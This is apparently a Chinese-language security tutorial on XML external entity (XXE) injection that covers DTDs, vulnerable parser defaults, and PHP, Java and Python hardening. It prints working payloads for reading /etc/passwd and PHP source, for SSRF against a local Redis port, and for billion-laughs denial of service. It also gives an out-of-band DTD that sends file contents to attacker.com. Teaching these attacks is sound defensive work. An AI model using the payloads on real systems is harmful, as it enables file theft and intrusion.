---
title: xxe
weight: 4
comments: true
type: docs
---

## 前置知识

### XML

XML（Extensible Markup Language）是一种用于传输和存储数据的标记语言，结构类似 HTML，但标签可自定义：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<user>
    <name>admin</name>
    <pass>123456</pass>
</user>
```

XML 文档可以包含一个 **DTD（Document Type Definition，文档类型定义）**，用来定义文档结构、元素、属性以及 **实体**

### DTD

DTD 用于约束 XML 的结构，可以写在 XML 内部，也可以引用外部文件：

内部DTD:

```xml-dtd
<?xml version="1.0"?>
<!DOCTYPE user [
    <!ELEMENT user (name, pass)>
    <!ELEMENT name (#PCDATA)>
    <!ELEMENT pass (#PCDATA)>
]>
<user>
    <name>admin</name>
    <pass>123456</pass>
</user>
```

外部DTD:

```xml-dtd
<!DOCTYPE user SYSTEM "http://example.com/user.dtd">
```

### 实体（Entity）

实体是XML中用来定义“变量”的机制，类似于宏，分为：

| 类型     | 语法                          | 说明                                |
| -------- | ----------------------------- | ----------------------------------- |
| 内部实体 | `<!ENTITY name "value">`      | 值在 DTD 内定义                     |
| 外部实体 | `<!ENTITY name SYSTEM "URI">` | 值来自外部资源                      |
| 参数实体 | `<!ENTITY % name "value">`    | 只能在 DTD 中使用，用 `%name;` 引用 |

内部实体案例：

```xml
<!DOCTYPE root [
    <!ENTITY company "Hello Corp">
]>
<root>&company;</root>
```

解析后，`&company;` 会被替换为 `Hello Corp`。

外部实体案例：

```xml-dtd
<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

解析的时候，XML解析器会去读取`file:///etc/passwd`，并将内容替换到`&xxe;`的位置，这就是XXE的根源

## XXE漏洞

> 它的本质就是XML外部实体注入，当XML解析器在解析用户可控的XML时，允许引用外部实体，攻击者就可以通过构造恶意DTD，让解析器读取本地文件，发起网络请求，执行SSRF，甚至造成拒绝服务

产生`xxe`漏洞的几个条件：

1. 应用程序会接收并解析XML，比如文件上传等

2. XML解析器允许加载外部实体，这是最关键的一环，不同语言、不同库的默认行为可能不同

| 语言 / 库        | 默认是否解析外部实体 | 说明                        |
| ---------------- | -------------------- | --------------------------- |
| PHP DOMDocument  | 旧版本默认允许       | 需显式禁用                  |
| PHP SimpleXML    | 旧版本默认允许       | 同上                        |
| Java SAX/DOM     | 默认允许             | 需手动关闭                  |
| Python lxml      | 默认允许             | 需 `resolve_entities=False` |
| Python xml.etree | 默认不允许           | 相对安全                    |
| .NET XmlReader   | 默认不允许           | 需手动开启                  |
| libxml2          | 旧版本默认允许       | PHP 底层                    |

在php中，常见的写法如下：

```php
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
```

- LIBXML_NOENT:把实体引用替换成实际内容（开启实体展开）
- LIBXML_DTDLOAD:允许加载外部DTD

这两个标志一起用的话，就差明说这里要到xxe了

3. 解析后的结果会以某种方法被使用或者回显

- 有回显：直接输出到响应，如`echo $dom->textContent;`
- 无回显：需要通过OOB(Out-of-Band)外带数据，如DNS,HTTP请求
- 间接使用：解析后的数据写入到数据库、日志、邮件等

## 常见的利用方法

- 读取本地文件

```xml-dtd
<?xml version="1.0"?>
<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

- 读取PHP源码（伪协议）

```xml-dtd
<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
]>
<root>&xxe;</root>
```

- SSRF探测内网

```xml-dtd
<!DOCTYPE root [
    <!ENTITY xxe SYSTEM "http://127.0.0.1:6379/">
]>
<root>&xxe;</root>
```

- 无回显XXE(OOB外带)

evil.dtd:

```xml
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/flag">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

xml:

```xml-dtd
<?xml version="1.0"?>
<!DOCTYPE root [
    <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
    %dtd;
]>
<root>test</root>
```

- 拒绝服务

```xml-dtd
<!DOCTYPE lolz [
    <!ENTITY lol "lol">
    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
    ...
]>
<lolz>&lol9;</lolz>
```

这里的实体会指数级展开，耗尽内存，造成DoS

- 命令执行（特定环境）

某些解析器支持expect://或gopher://，可间接执行命令或攻击内网服务，比如Redis,FastCGI

## 防御XXE的各种姿势

1. 禁用外部实体

PHP:

```php
libxml_disable_entity_loader(true); // PHP < 8.0
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NONET);  // 不加载外部 DTD
```

Java:

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setXIncludeAware(false);
dbf.setExpandEntityReferences(false);
```

Python:

```python
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True)
```

2. 不要使用危险标志

```php
LIBXML_NOENT | LIBXML_DTDLOAD
```

3. 使用 JSON 替代 XML

如果业务允许，直接改用 JSON，从根源避免 XXE。

4. 白名单校验

对 XML 结构、标签、DTD 做严格白名单校验。

5. 最小权限运行

Web 服务以低权限用户运行，限制文件读取范围。

6. 网络隔离

限制服务器出网，降低 SSRF 和 OOB 外带风险。

这里留份修复模板

```php
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $xmlfile = file_get_contents("php://input");

    // 关闭错误显示，防信息泄露
    ini_set('display_errors', '0');
    error_reporting(0);

    // PHP < 8.0 禁用外部实体
    if (PHP_VERSION_ID < 80000) {
        libxml_disable_entity_loader(true);
    }

    // 可选：直接拒绝 DOCTYPE
    if (stripos($xmlfile, '<!DOCTYPE') !== false) {
        http_response_code(400);
        exit('DOCTYPE not allowed');
    }

    $dom = new DOMDocument();
    // 关键：不用 LIBXML_NOENT | LIBXML_DTDLOAD，改用 LIBXML_NONET
    if (!$dom->loadXML($xmlfile, LIBXML_NONET)) {
        http_response_code(400);
        exit('Invalid XML');
    }

    $creds = simplexml_import_dom($dom);
    echo "<pre>" . htmlspecialchars($dom->textContent) . "</pre>";
    exit;
}
```

